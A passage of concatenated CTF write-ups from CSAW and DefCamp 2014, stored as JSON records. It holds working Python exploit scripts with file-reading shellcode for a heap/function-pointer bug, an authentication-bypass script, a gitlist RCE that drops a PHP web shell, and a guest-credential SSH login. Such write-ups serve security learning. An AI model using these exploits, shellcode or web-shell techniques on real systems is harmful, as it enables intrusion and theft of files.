\"license\" for more information.\n\t>>> print \"\\x59\\x4F\\x55\\x20\\x44\\x49\\x44\\x20\\x49\\x54\\x21\\x20\\x43\\x4F\\x4E\\x47\\x52\\x41\\x54\\x53\\x21\\x20\\x66\\x77\\x69\\x77\\x2C\\x20\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x20\\x6F\\x62\\x66\\x75\\x73\\x63\\x61\\x74\\x69\\x6F\\x6E\\x20\\x69\\x73\\x20\\x73\\x6F\\x66\\x61\\x20\\x6B\\x69\\x6E\\x67\\x20\\x64\\x75\\x6D\\x62\\x20\\x20\\x3A\\x29\\x20\\x6B\\x65\\x79\\x7B\\x54\\x68\\x6F\\x73\\x65\\x20\\x46\\x6C\\x75\\x66\\x66\\x79\\x20\\x42\\x75\\x6E\\x6E\\x69\\x65\\x73\\x20\\x4D\\x61\\x6B\\x65\\x20\\x54\\x75\\x6D\\x6D\\x79\\x20\\x42\\x75\\x6D\\x70\\x79\\x7D\"\n\tYOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}\n\t>>>\n\nSo, finally, here was the flag!\n\n\tkey{Those Fluffy Bunnies Make Tummy Bumpy}\n\n\n", "timestamp": "2025-10-24T11:40:12.155816"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/csaw/s3.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/csaw/s3.md", "content": "### Solved by barrebas\n\nA while ago, we threw together a semi-official VulnHub CTF. This team participated in the CSAW CTF. For me, it was a new and _humbling_ experience. I didn't get a lot of flags but I managed to get this one.\n\nUpon downloading the binary called ```s3```, I connected to the remote server to quickly see what I was up against.\n\n```\n$ nc 54.165.225.121 5333\n```\n\nHowever, the connection timed out very quickly. I checked out the local copy with file:\n\n```\n$ file s3\ns3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped\n```\n\nInteresting, a 64 bit binary. Viewing it in ```hopper``` suggested that it is a C++ binary. I started the binary locally and faced the same quick time-out. This didn't sit well with me, because I could hardly enter the second command to play around.\n\nI fired up ```gdb-peda``` and ran the binary. It quickly showed the problem:\n\n```\ngdb-peda$ r\nwarning: Could not load shared library symbols for linux-vdso.so.1.\nDo you need \"set solib-search-path\" or \"set sysroot\"?\nWelcome to Amazon S3 (String Storage Service)\n\n    c <type> <string> - Create the string <string> as <type>\n                        Types are:\n                            0 - NULL-Terminated String\n                            1 - Counted String\n    r <id>            - Read the string referenced by <id>\n    u <id> <string>   - Update the string referenced by <id> to <string>\n    d <id>            - Destroy the string referenced by <id>\n    x                 - Exit Amazon S3\n\n>\nProgram received signal SIGALRM, Alarm clock.\n```\n\n![s3: gdb caught the alarm.](/images/2014/csaw/s3/s3-gdb-alarm.png)\n\nTurns out this SIGALRM is generated by a call to [alarm()](http://linux.die.net/man/2/alarm). In hindsight, I could have made a library that overrides the call to ```alarm()```, but I went with the hex-editing approach. I disassembled the binary using ```objdump``` and used ```grep``` to search the output for \"alarm\":\n\n```\n$ objdump -d s3 | grep alarm\n0000000000401300 <alarm@plt>:\n  402126:   e8 d5 f1 ff ff          callq  401300 <alarm@plt>\n  403771:   e8 8a db ff ff          callq  401300 <alarm@plt>\n```\n\nUsing ```xxd```, ```objdump``` and ```sed```, I replaced those bytes with NOPs and reversed the process with ```xxd -r```, generating a new binary in the process that was devoid of annoying timeouts!\n\nThe binary allows the storage of two types of strings: NULL-terminated and so-called \"counted\" strings. I assume these are like the strings used in Pascal, where the length of the string is prepended to the string. I created a NULL-terminated string and the binary gave me an identifier. I updated the string and was given another, very similar identifier. I read the string, deleted it and tried to read it again. The program happily told me there was no such string identifier and called it a day. I did notice that the string identifiers are in fact hex-addresses and examining these locations in gdb confirmed it.\n\n![s3: NULL-terminated strings, no problems!](/images/2014/csaw/s3/s3-NULL-string.png)\n\nNext, the obvious target was the \"counted\" string. I created a string \"bleh\", updated it to \"blehbleh\" and tried to read from it... segfault! Awesome, we have a lead.\n\n![s3: counted strings... Oops!](/images/2014/csaw/s3/s3-countedstring-segfault.png)\n\nTime to fire up ```gdb``` again and try to reproduce the crash:\n\n![s3: success! Let's see what's going on.](/images/2014/csaw/s3/s3-gdb-reproduced-crash.png)\n\nIt looks like the updated string somehow overwrites a function pointer. This pointer is used here:\n\n```\n=> 0x4019d6:    call   QWORD PTR [rax+0x10]\n```\n\nObviously, ```0x42424242-0x10``` holds nothing interesting. However, we have overwritten a function pointer with a value that we control so in principle, we can hijack ```EIP``` and execute arbitrary code! The drawback is that the pointer is derefenced, so in order to execute any shellcode, we need to do the following:\n\n![s3: exploitation flow](/images/2014/csaw/s3/strings.png)\n\nWe store shellcode somewhere, we store a pointer to the shellcode and finally, we overwrite the function pointer with a pointer to the pointer to the shellcode... confusing, eh? I went bit by bit, using the string storing service to store stuff. The string identifiers turned out to be memory addresses:\n\n![s3: memory addresses as string identifiers](/images/2014/csaw/s3/s3-gdb-id-is-address.png)\n\nI got tired of copying and pasting the string identifiers so I switched over to python. In order to emulate the server, I put the binary behind a nc listener:\n\n```\n$ while [[ 1 ]]; do nc -e ./s3 -v -l -p 5333; done\n```\n\nNotice that I'm using ```s3``` again, as this will automagically restart without the need for a clean shutdown (in case the script needs debugging). I enabled coredumps with ```ulimit -c unlimited``` and started scripting and debugging, a lot.\n\n```\n#!/usr/bin/python\n\nfrom socket import *\nimport time, re, struct\n\n\ndef getID(data):\n    match = re.search(r'(\\d.*)$', data.strip())<\n    if match:\n        return int(match.group(1))\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect(('localhost', 5333))\n\n# banner\nprint s.recv(1024)\n\n# send first string. this will be our shellcode\ns.send('c 0 CTF!\\n')\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_shellcode = getID(data)\n\nprint '[+] first location = 0x{0:08x}'.format(p_shellcode)\n\n# send second string. this will be our 'pivot' pointer.\n# let's crash the binary to see if this works\ns.send(\"c 1\\n\")\n\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_tmp = getID(data)\n\ns.send('u ' + str(p_tmp) + ' AAAA\\n')\n\ndata = s.recv(64)\np_pivot = getID(data)\n\nprint '[+] second location = 0x{0:08x}'.format(p_pivot)\n\n# send read request to crash binary\n\ns.send('r ' + str(p_pivot) + '\\n')\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\n\n# terminate connection cleanly\ntime.sleep(0.1)\ns.send('x\\n')\n\ns.close()\n```\n\nAfter running this (and careful debugging of the script) I got a coredump:\n\n```\n$ python ./amaz.py\nWelcome to Amazon S3 (String Storage Service)\n\n    c <type> <string> - Create the string <string> as <type>\n                        Types are:\n                            0 - NULL-Terminated String\n                            1 - Counted String\n    r <id>            - Read the string referenced by <id>\n    u <id> <string>   - Update the string referenced by <id> to <string>\n    d <id>            - Destroy the string referenced by <id>\n    x                 - Exit Amazon S3\n\n\n[+] first location = 0x00b10030\n[+] second location = 0x00b10050\nbas@tritonal:~/documents/s3 writeup$ gdb ./s3 core\n...snip...\ngdb-peda$ i r\nrax            0x41414141   0x41414141\n```\n\nGood, we have control over ```rax```. Now let's use this to dereference the pointer to the first string:\n\n```\ns.send('u ' + str(p_tmp) + ' ' + struct.pack('>L', p_shellcode-0x10) + '\\n')\n```\n\nWhich obviously still crashes, because now the binary executes:\n\n```\n#0  0x0000000021465443 in ?? ()\n```\n\nWhich obviously contains no data, nor any code. But let's give it a proper pointer, shall we? And while I'm at it, I'll set the shellcode to ```INT3```. The stack is executable, so this should work!\n\n```\n#!/usr/bin/python\n\nfrom socket import *\nimport time, re, struct\n\n\ndef getID(data):\n    match = re.search(r'(\\d.*)$', data.strip())\n    if match:\n        return int(match.group(1))\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect(('localhost', 5333))\n\n# banner\nprint s.recv(1024)\n\n# send first string. this will be our shellcode\ns.send('c 0 \\xCC\\xCC\\xCC\\xCC\\n')\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_shellcode = getID(data)\n\nprint '[+] shellcode = 0x{0:08x}'.format(p_shellcode)\n\n\n# send second string. this will be our 'pivot' pointer.\ns.send('c 0 ' + struct.pack('<L', p_shellcode) + '\\n')\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_pivot = getID(data)\n\nprint '[+] pivot = 0x{0:08x}'.format(p_pivot)\n\n# let's crash the binary to see if this works\ns.send(\"c 1\\n\")\n\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_tmp = getID(data)\n\ns.send('u ' + str(p_tmp) + ' ' + struct.pack('<L', p_pivot-0x10) + '\\n')\n\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_vuln = getID(data)\n\nprint '[+] vulnerable pointer = 0x{0:08x}'.format(p_vuln)\n\n# send read request to crash binary\ns.send('r ' + str(p_vuln) + '\\n')\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\n\n# terminate connection cleanly\ntime.sleep(0.1)\ns.send('x\\n')\n\ns.close()\n```\n\nIn the other terminal, I observed:\n\n```\nconnect to [127.0.0.1] from localhost [127.0.0.1] 53500\nTrace/breakpoint trap (core dumped)\nlistening on [any] 5333 ...\n```\n\nBOOM! Code execution on my local machine!\n\nAt this point I wasted some time to cook up a small shellcode that would re-use existing code in the binary, to verify that the stack was indeed executable in the remote binary. It was, whoop-dee-doo! Next I searched for a proper shellcode and stumbled upon [this one!](http://shell-storm.org/shellcode/files/shellcode-878.php).\n\nI stuck it in the exploit and lo and behold:\n\n```\n#!/usr/bin/python\n\nfrom socket import *\nimport time, re, struct\n\n\ndef getID(data):\n    match = re.search(r'(\\d.*)$', data.strip())\n    if match:\n        return int(match.group(1))\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect(('localhost', 5333))\n\n# banner\nprint s.recv(1024)\n\n# send first string. this will be our shellcode\ns.send('c 0 \\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\xc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41\\n')\n\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_shellcode = getID(data)\n\nprint '[+] shellcode = 0x{0:08x}'.format(p_shellcode)\n\n\n# send second string. this will be our 'pivot' pointer.\ns.send('c 0 ' + struct.pack('<L', p_shellcode) + '\\n')\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_pivot = getID(data)\n\nprint '[+] pivot = 0x{0:08x}'.format(p_pivot)\n\n# let's crash the binary to see if this works\ns.send(\"c 1\\n\")\n\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_tmp = getID(data)\n\ns.send('u ' + str(p_tmp) + ' ' + struct.pack('<L', p_pivot-0x10) + '\\n')\n\ndata = s.recv(64)\ns.recv(2)   # receive pesky '> '\np_vuln = getID(data)\n\nprint '[+] vulnerable pointer = 0x{0:08x}'.format(p_vuln)\n\n# send read request to crash binary\ns.send('r ' + str(p_vuln) + '\\n')\n\nprint s.recv(1000)\n# terminate connection cleanly\ntime.sleep(0.1)\ns.send('x\\n')\n\ns.close()\n```\n\n```\n[+] shellcode = 0x01355030\n[+] pivot = 0x01355030\n[+] vulnerable pointer = 0x013552b0\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\n...snip...\n```\n\nThis also worked against the remote server! It showed me that there was a user called ```amazon``` with home directory ```/home/amazon```. I adapted the exploit a bit to make it read arbitrary files. The instruction that needs adjusting is this one:\n\n```\n; NULL byte fix\nxor byte [rdi + 11], 0x41\n```\n\nWe need to update the value 11, or ```0x0b```. The exploit code was modified once more, spraying ```time.sleep()``` calls here and there:\n\n```\n#!/usr/bin/python\n\nfrom socket import *\nimport time, re, struct, sys\n\n\ndef getID(data):\n    match = re.search(r'(\\d.*)', data.strip())\n    if match:\n        return int(match.group(1))\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect(('localhost', 5333))\n\n# banner\ns.recv(1024)\n\nlength = len(sys.argv[1])\nfilename = sys.argv[1].strip()\n# send first string. this will be our shellcode\ns.send('c 0 \\xeb\\x3f\\x5f\\x80\\x77'+struct.pack('<b', length)+'\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\xc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff'+filename+'A\\n')\n\ntime.sleep(0.1)\n#s.recv(2)  # receive pesky '> '\ndata = s.recv(64)\np_shellcode = getID(data)\n\nprint '[+] shellcode = 0x{0:08x}'.format(p_shellcode)\n\n# send second string. this will be our 'pivot' pointer.\ns.send('c 0 ' + struct.pack('<L', p_shellcode) + '\\n')\n\ntime.sleep(0.1)\ndata = s.recv(64)\np_pivot = getID(data)\n\nprint '[+] pivot = 0x{0:08x}'.format(p_pivot)\n\n# let's crash the binary to see if this works\ns.send(\"c 1\\n\")\n\ntime.sleep(0.1)\ndata = s.recv(64)\np_tmp = getID(data)\n\ns.send('u ' + str(p_tmp) + ' ' + struct.pack('<L', p_pivot-0x10) + '\\n')\n\ntime.sleep(0.1)\ndata = s.recv(64)\np_vuln = getID(data)\n\nprint '[+] vulnerable pointer = 0x{0:08x}'.format(p_vuln)\n\n# send read request to crash binary\ns.send('r ' + str(p_vuln) + '\\n')\n\ntime.sleep(0.1)\nprint s.recv(1024)\n\n# terminate connection cleanly\ntime.sleep(0.1)\ns.send('x\\n')\n\ns.close()\n```\n\n(Note: this exploit fails if the address contains a NULL byte, a space or a zero, as these truncate data. During the CTF, I experienced no problems).\n\nNow it was a matter of getting the flag. I tried ```/home/amazon/key```, which returned nothing. Next was ```/home/amazon/flag``` and that was a bingo :)\n\n", "timestamp": "2025-10-24T11:40:12.240197"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/csaw/saturn.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/csaw/saturn.md", "content": "### Solved by\n\n- **Superkojiman** as *My brain runs assembly code*\n- **Barrebas** as *The silent disassembler ninja*\n- **Swappage** as *The mumbler and random guesser*\n\nHello hello, Swappage here writing on behalf of the whole group that worked on this exploit dev :) please don't kill me as my English is really terrible, although it might also be Koji and Bas' fault for not reviewing this doc properly before publishing :p\n\nDuring the past weekend me and a bunch of dudes from [VulnHub](http://vulnhub.com) decided to test ourselves and play the CSAW 2014 CTF challenge. Along wight he 300 point Forensics challenge, Saturn at exploitation 400 was one of the more interesting ones to solve. This is our writeup on it.\n\nthe question from the challenge stated:\n\n*You have stolen the checking program for the CSAW Challenge-Response-Authentication-Protocol system. Unfortunately you forgot to grab the challenge-response keygen algorithm (libchallengeresponse.so). Can you still manage to bypass the secure system and read the flag?*\n\nSo basically our objective was to find a way to bypass the challenge-response handshake authentication process handled by this binary to read the flag; it was also obvious that we were missing a component, which was supposed to handle the task of generating the challenge response, and that we needed to live with it.\n\n## Getting the binary to run\nA quick check against the binary using ldd confirmed that we actually were missing a module which was needed for the application to run; relying simply on static analysis might be **extremely** frustrating and unproductive, so our first step was to make sure we could execute the binary locally to also perform dynamic analysis.\nWe came up with the following code snippet that we compiled as shared library:\n\nHere is the .c snipplet\n\n```c\n\t#include <stdio.h>\n\t#include <stdlib.h>\n\n\tint fillChallengeResponse() {\n\t\treturn 0;\n\t}\n```\n\nand the .h\n\n```c\n\tint fillChallengeResponse();\n```\n\nThey were nothing but a dummy function but it was enough to be able to run the binary without it terminating.\n\n## The application structure\n\nBy doing some static analysis we determined that saturn was made of three main parts:\n\n- one responsible for providing the client a challenge\n- one responsible for checking the response sent by the client to the server\n- and the last one that would print out the flag if the response from the client was correct.\n\nThe access to these 3 branches was handled by something similar to a case switch, where the layout of the buffer sent by the client was verified for a sequence of commands as follows:\n\n- if the first byte was in the range of 0xa0 to 0xaf the execution flow would get into the function responsible for providing the challenge to the client\n- if the first byte was in the range of 0xe0 to 0xef the execution flow would get into the function responsible for checking the response\n- if the first byte was a 0x80, the execution flow would get into the function responsible for printing the flag to stdout.\n\n![](/images/2014/csaw/saturn/caseswitch.png)\n\nAt this point we knew that intended way to interact with the binary was to\n\n- send the command sequence to request a challenge\n- send the response\n- send the command to receive the flag\n\n## The genChallenge() function\n\nYes, i named it this way, in fact the binary was stripped, so while debugging using IDA i decided to rename it for making things easier :D\nBy the way...\nThe second step was to closely verify how the function responsible for providing the challenge to the client actually worked\n\n``` c-objdump\n\t.text:0804885C                 push    ebp\n\t.text:0804885D                 mov     ebp, esp\n\t.text:0804885F                 push    ebx\n\t.text:08048860                 sub     esp, 34h\n\t.text:08048863                 mov     eax, [ebp+arg_0]\n\t.text:08048866                 mov     [ebp+var_1C], al\n\t.text:08048869                 movzx   eax, [ebp+var_1C]\n\t.text:0804886D                 and     eax, 0Fh\t\t\t; <=====\n\t.text:08048870                 mov     [ebp+var_11], al\n\t.text:08048873                 mov     eax, off_804A050\t\t; <=====\n\t...\n\t.text:080488B9                 mov     [esp+10h], ebx\n\t.text:080488BD                 mov     [esp+0Ch], ecx\n\t.text:080488C1                 mov     [esp+8], edx\n\t.text:080488C5                 mov     [esp+4], eax\n\t.text:080488C9                 mov     dword ptr [esp], offset format ; \"%c%c%c%c\"\n\t.text:080488D0                 call    _printf\n\t.text:080488D5                 mov     eax, ds:stdout\n\t.text:080488DA                 mov     [esp], eax      ; stream\n\t.text:080488DD                 call    _fflush\n\t.text:080488E2                 add     esp, 34h\n\t.text:080488E5                 pop     ebx\n\t.text:080488E6                 pop     ebp\n```\n\nWe figured out that the challenge was read and returned to the client from a memory location controlled by the second digit of the byte, which meant that if we sent \\xa0 we received 4 bytes, while if we were sending \\xa1 we were receiving 4 other bytes.\nThis Part required a lot of testing and analysis by *talking* also to the real server, in fact we didn't have the library that would generate the challenge/response, and therefore these memory locations were all 0.\n\nAfter a couple of trial and error, and thanks to superkojiman's smartness, we figured out that we could send a sequence of commands and read up to a total of 32 bytes of memory, by sending \\xa0\\xa1\\xa2... and so on. (more on this later, as this is really important).\n\nAt this point we thought then, that the challenge, wasn't composed of 4 bytes, but probably by 32.\n\n## The checkResponse() function\n\nThe check response function was the one responsible for actually verifying the validity of the response provided by the client.\n\nTo access this branch of code the client had to send the proper command, in the range of 0xe0 to 0xef followed by a sequence of 4 bytes representing (part) of the response.\n\n``` c-objdump\n\t.text:080488E8                 push    ebp\n\t.text:080488E9                 mov     ebp, esp\n\t.text:080488EB                 sub     esp, 28h\n\t.text:080488EE                 mov     eax, [ebp+arg_0]\n\t.text:080488F1                 mov     [ebp+var_1C], al\n\t.text:080488F4                 movzx   eax, [ebp+var_1C]\n\t.text:080488F8                 and     eax, 0Fh\n\t.text:080488FB                 mov     [ebp+var_15], al\n\t.text:080488FE                 mov     eax, off_804A054\t\t; <== the memory location from which the response is read\n\t.text:08048903                 movzx   edx, [ebp+var_15]\n\t.text:08048907                 shl     edx, 2\n\t.text:0804890A                 add     eax, edx\n\t.text:0804890C                 mov     eax, [eax]\n\t.text:0804890E                 mov     [ebp+var_10], eax\n\t.text:08048911                 mov     dword ptr [esp+8], 4 ; nbytes\n\t.text:08048919                 lea     eax, [ebp+buf]\n\t.text:0804891C                 mov     [esp+4], eax    ; buf\n\t.text:08048920                 mov     dword ptr [esp], 0 ; fd\n\t.text:08048927                 call    _read\n\t.text:0804892C                 mov     eax, [ebp+buf]\n\t.text:0804892F                 mov     [ebp+var_C], eax\n\t.text:08048932                 mov     eax, [ebp+var_C]\n\t.text:08048935                 cmp     eax, [ebp+var_10]\n\t.text:08048938                 jz      short loc_8048946\n\t.text:0804893A                 mov     dword ptr [esp], 0 ; status\n\t.text:08048941                 call    _exit\n\t.text:08048946\n\t.text:08048946 loc_8048946:\n\t.text:08048946                 movzx   eax, [ebp+var_15]\n\t.text:0804894A                 mov     ds:dword_804A0A0[eax*4], 1\t; <== if bytes are correct this memory location is set to 1\n\t.text:08048955                 leave\n\t.text:08048956                 retn\n```\n\nAgain, we missed the library responsible for generating the challenge response, so everything was 0 to us yet we could figure out that\n\n- if the bytes were correct the memory location at address *dword_804A0A0[eax*4]* was set to 1\n- if the bytes were wrong exit() was called instead causing the application to terminate.\n\nAt this point that was all we knew, as we were still missing an important part of the puzzle, which comes into play when the function that is supposed to finally open and read the flag for us is called.\n\n## A matter of cycling\n\nWe thought we were really close to solving the puzzle, but we were obviously proved wrong.\n\nIf we take a look at the graph of the function responsible of opening the flag.txt file and then writing it to stdout, we can notice that there is a funny and evil function which i decided to name Cycles()\n\n![](/images/2014/csaw/saturn/openfile.png)\n\nApparantly it looks like that depending on the return value of that function, we would or wouldn't be able to read the flag.\n\nLet's give a quick look at the function\n\n![](/images/2014/csaw/saturn/cycles.png)\n\nThe concept is as simple as this:\n\n- the function cycles 8 times using the address pointed by ebp+var_4 as counter\n- at first it zeroes out EAX\n- then it moves the value from the memory location at address dword_804A0A0[eax*4 into EAX\n- and it multiplies EAX by EBP+var_8 (which is always 1)\n- at the end of the 8 iterations it returns the value in EAX\n\nSo, considering that to get to read the flag, the only way to do that was for this function to return 1, that meant that EAX had to be 1 after the 8 cycles ended\nAt this point the only way, was to have dword_804A0A0[eax*4 to contain 1.\n\nBut wait, where did i see this address before? it looks familiar...\n\nIf we get back to the function that checks the response (the one accessed by sending \\xeN) we notice that the memory location is exactly the same\n\n``` c-objdump\n\t.text:08048946                 movzx   eax, [ebp+var_15]\n\t.text:0804894A                 mov     ds:dword_804A0A0[eax*4], 1\t; <== if bytes are correct this memory location is set to 1\n\t.text:08048955                 leave\n\t.text:08048956                 retn\n```\n\n``` c-objdump\n\t.text:08048803                 mov     eax, [ebp+var_4]\n\t.text:08048806                 mov     eax, ds:dword_804A0A0[eax*4]\t; <== if this is 1, eax is 1\n\t.text:0804880D                 mov     edx, [ebp+var_8]\n\t.text:08048810                 imul    eax, edx\n```\nIn the end, the purpose of this function then, was to perform a further check and see if the **whole** response was correct.. wait, what? the WHOLE? (more on this later)\n\n## How we saw the light at the end of the tunnel\n\nAt this point everything was starting to make sense, but we were missing a point..\nthen all of a sudden we began to mumble about those 8 iterations\n\n*8 iterations.. 8 iterations... but what if?...*\n\nAnd that's how a simple guessing can lead to the solution, what if we needed to send 8 chunks of 4 bytes and build a whole response?\nwe thought, then that bitwise AND would make sense, we were able to get a total of 32 bytes of challenge from the server, maybe it's expecting us to send it 32 bytes, in chunk of 4.\n\nwe quickly tried that out by building a buffer that would at first pull 32 bytes of challenge 4 bytes at a time\n\n\t\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\n\nand then send the response with\n\n\t\"\\xe0\" + <the four bytes received from \\xa0> + \"\\xe1\" + <the 4 bytes received from \\xa1>.....*\n\nand punched it to the server.. DAMN, no luck, it didn't work!\nyet we were so close..\n\nThen at a certain point, Barrebas, who was sitting silent working on reversing the binary said...\n\n*\"Wait.. the response is checked starting at a memory location that is 32 bytes away from where the challenge is read from\"*\n\nWe saw the light! :D\nwe remembered that we could send commands from \\xa0 to \\xaf, which probably meant we could read past the 32 bytes of the challenge... what if we tried to verify with \\xe0 the output from \\xa8, and all the way onward to \\xe7 with \\xaf?\n\nThat would have probably sent the expected response to the server for each challenge request.. we tried and..\nBAM! we got the flag!\n\n\t# ./updated.py\n\tCSAW ChallengeResponseAuthenticationProtocol Flag Storage\n\n\tflag{greetings_to_pure_digital}\n\nHere is the script we used as exploit to retrieve the flag from the server\n\n```python\n\t#!/usr/bin/env python\n\n\tfrom socket import *\n\timport sys, struct\n\timport time\n\n\ttarget = \"54.85.89.65\"\n\t#target = \"127.0.0.1\"\n\n\ts = socket(AF_INET, SOCK_STREAM)\n\ts.connect((target, 8888))\n\n\tprint s.recv(1024)  # banner\n\n\ts.send(\"\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\")\n\tc0 = s.recv(4)        # challenge 0\n\tc1 = s.recv(4)        # challenge 1\n\tc2 = s.recv(4)        # challenge 2\n\tc3 = s.recv(4)        # challenge 3\n\tc4 = s.recv(4)        # challenge 4\n\tc5 = s.recv(4)        # challenge 5\n\tc6 = s.recv(4)        # challenge 6\n\tc7 = s.recv(4)        # challenge 7\n\n\tchallenge = c0 + c1 + c2 + c3 + c4 + c5 + c6 + c7\n\n\tbuf = (\n\t\"\\xe0\" + c0 +\n\t\"\\xe1\" + c1 +\n\t\"\\xe2\" + c2 +\n\t\"\\xe3\" + c3 +\n\t\"\\xe4\" + c4 +\n\t\"\\xe5\" + c5 +\n\t\"\\xe6\" + c6 +\n\t\"\\xe7\" + c7 +\n\t\"\\x80\"\n\t)\n\ts.send(buf)\n\tprint s.recv(1024)\n```\n", "timestamp": "2025-10-24T11:40:12.331747"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/defcamp/exploit-300.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/defcamp/exploit-300.md", "content": "### Solved by superkojiman\n\nAn IP address 10.13.37.33 is provided. I guess people had trouble figuring out what to do here because eventually they threw out a hint \"gitlist\". Navigating to http://10.13.37.33/gitlist showed a redis repository.\n\n![](/images/2014/defcamp/exploit300/01.png)\n\nIt turns out gitlist is vulnerable to remote command execution, and an exploit was readily available at [http://www.exploit-db.com/exploits/33929/](http://www.exploit-db.com/exploits/33929/). I downloaded it and executed it:\n\n```\n# python 33929.py http://10.13.37.33/gitlist/redis /var/ww/git/cache\n[!] Using cache location /var/ww/git/cache\n[!] Shell dropped; go hit http://10.13.37.33/gitlist/cache/x.php?cmd=ls\n```\n\nWe supposedly have remote command execution now, so I tried it by passing the id command:\n\n![](/images/2014/defcamp/exploit300/02.png)\n\nYep, it worked! I used this to enumerate the target and eventually found some interesting files in the / directory:\n\n![](/images/2014/defcamp/exploit300/03.png)\n\ne3.flag looked promising. Opening it up revealed the flag for this challenge:\n\n![](/images/2014/defcamp/exploit300/04.png)\n\nThe flag is **stupid psychopathic git**\n", "timestamp": "2025-10-24T11:40:12.728395"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/defcamp/misc-400.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/defcamp/misc-400.md", "content": "### Solved by superkojiman and barrebas\n\nbarrebas did the intial enumeration and found CesarFTP 0.99 running on the target. CesarFTP is a windows FTP server, so we were up against a Windows server.\n\n```\nStarting Nmap 6.00 ( http://nmap.org ) at 2014-10-18 14:04 CEST\nNmap scan report for 10.66.66.3\nHost is up (0.015s latency).\nNot shown: 998 filtered ports\nPORT     STATE SERVICE\n21/tcp   open  ftp\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 6.41 seconds\nbas@tritonal:~/documents$ ftp 10.66.66.3\nConnected to 10.66.66.3.\n220 CesarFTP 0.99g Server Welcome !\nName (10.66.66.3:bas):\n```\n\nThere are actually exploits readily available for this, but I had also written one in the past and was able to dig it up. This target also had RDP open so I connected to it and found that it was running Windows XP Pro. This was important in order to properly customize the exploit to jump to the payload.\n\nHowever, the FTP server was always down. My guess is that people were crashing it while fuzzing or trying an exploit that didn't work. I'm not entirely sure why they didn't come up with a mechamis to relaunch CesarFTP, or perhaps they were unable to keep up with all the fuzzing. To get around it, they provided the virtual machine of the target for download.\n\nAt that point, there was no reason to exploit CesarFTP. I simply booted the virtual machine up with a CrunchBang Linux live CD, navigated to C:\\Documents and Settings\\FTP\\Desktop and found the flag in a file called ThisIsIt.txt\n\n![](/images/2014/defcamp/misc400/01.png)\n\nThe flag is **Caesar Salad**\n\n", "timestamp": "2025-10-24T11:40:12.804060"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/defcamp/network-100.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/defcamp/network-100.md", "content": "### Solved by barrebas\n\nFor this challenge, we're given the following clue:\n\n```\nMy manager lives at 10.13.37.21. Any guest is always welcome. But he has a secret. Can you find it out?\n```\n\nI did a simple nmap scan of that box:\n\n```bash\nStarting Nmap 6.00 ( http://nmap.org ) at 2014-10-18 13:08 CEST\nNmap scan report for 10.13.37.21\nHost is up (0.024s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n```\n\nThe webpage has a login form, but I didn't have any credentials. The clue did say guests are always welcome, but ```guest:guest``` didn't work. However, these credentials *did* work for ```ssh```! So I landed a shell on the box:\n\n```bash\nWelcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-37-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com/\nLast login: Sat Oct 18 00:05:47 2014 from 10.13.37.1\nguest@n1:~$ ls\ntoolkit\nguest@n1:~$ ls -alh\ntotal 32K\ndrwxr-xr-x 4 guest guest 4.0K Oct 18 00:06 .\ndrwxr-xr-x 4 root  root  